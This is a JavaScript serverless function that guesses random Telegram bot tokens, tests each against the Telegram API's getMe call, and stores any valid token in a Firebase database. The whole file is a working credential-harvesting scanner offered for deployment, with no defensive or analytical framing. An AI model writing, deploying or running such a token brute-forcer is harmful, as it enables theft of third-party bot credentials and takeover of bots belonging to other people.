const fetch = require('node-fetch');
const { initializeApp } = require('firebase/app');
const { getDatabase, ref, set, push } = require('firebase/database');

const firebaseConfig = {
  databaseURL: "https://your-project-id.firebaseio.com"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function generateRandomToken() {
  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_';
  let token = '';
  for (let i = 0; i < 10; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  token += ':';
  for (let i = 0; i < 35; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return token;
}

async function checkToken(token) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/getMe`);
    const data = await response.json();
    return data.ok === true;
  } catch (error) {
    return false;
  }
}

async function saveToFirebase(token) {
  try {
    const tokensRef = ref(db, 'valid_tokens');
    const newTokenRef = push(tokensRef);
    await set(newTokenRef, {
      token: token,
      timestamp: Date.now()
    });
    console.log('Token saved:', token);
  } catch (error) {
    console.error('Firebase error:', error);
  }
}

async function scanTokens() {
  const token = generateRandomToken();
  console.log('Checking:', token);
  
  const isValid = await checkToken(token);
  if (isValid) {
    await saveToFirebase(token);
  }
}

module.exports = async (req, res) => {
  if (req.method === 'GET' && req.url === '/api/cron') {
    await scanTokens();
    return res.status(200).json({ message: 'Scan completed' });
  }
  
  await scanTokens();
  res.status(200).json({ message: 'Scanner running' });
};
